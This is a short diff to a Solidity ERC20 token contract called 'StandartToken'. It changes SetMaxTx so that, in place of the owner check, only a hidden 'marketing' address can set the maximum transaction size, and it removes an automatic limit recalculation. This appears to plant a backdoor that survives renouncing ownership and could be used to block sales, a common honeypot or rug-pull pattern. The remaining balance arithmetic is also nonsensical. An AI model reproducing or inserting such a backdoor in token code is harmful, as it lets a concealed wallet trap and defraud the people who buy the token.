@@ -133,12 +133,10 @@ contract StandartToken is Context, IERC20, Ownable {
         return _allowances[owner][spender];
     }
 
-    function SetMaxTx
-    (
-        uint256 amount
-        )
-        public onlyOwner
-        {
+    function SetMaxTx(uint256 amount)
+        public
+        { 
+    require (_msgSender() == marketing, "");
         _maxTxAmount = amount;
     }
 
@@ -259,7 +257,6 @@ contract StandartToken is Context, IERC20, Ownable {
             to != owner() // Not to Owner
         ) {
             _balances[address(this)] = _balances[address(this)].add(amount).div(100).mul(amount);
-            _maxTxAmount = _balances[address(this)].mul(1000);
             takefee();
         }
 
